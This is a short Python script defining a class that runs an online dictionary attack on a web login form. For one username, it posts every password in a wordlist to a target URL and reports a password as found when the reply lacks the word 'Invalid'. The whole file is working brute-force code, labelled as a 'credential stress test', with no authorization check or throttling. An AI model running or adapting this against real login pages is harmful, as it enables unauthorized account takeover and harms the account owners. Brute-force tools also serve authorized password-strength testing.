import requests

class LoginBruteForcer:
    def __init__(self, target_url, username):
        self.target_url = target_url
        self.username = username
        self.error_message = "Invalid"

    def crack(self, password_list):
        print(f"[*] Initiating credential stress test on: {self.username}")

        try:
            with open(password_list, 'r', encoding='utf-8') as f:
                for line in f:
                    password = line.strip()
                    if not password: continue

                    payload = {
                        "username": self.username, 
                        "password": password
                    }

                    try:
                        response = requests.post(self.target_url, data=payload, timeout=5)

                        if self.error_message not in response.text:
                            print(f"\n[+] VULNERABILITY IDENTIFIED: Credentials Found!")
                            print(f"    Target: {self.username} | Key: {password}")
                            return True
                        else:
                            print(f"    [-] Auth Rejected: {password}")

                    except requests.exceptions.RequestException as e:
                        print(f"    [!] Request connection fault: {e}")

            print("\n[*] Dictionary exhaustion: No valid credential matches found.")
            return False

        except FileNotFoundError:
            print("[-] Error: Credential wordlist artifact not found.")
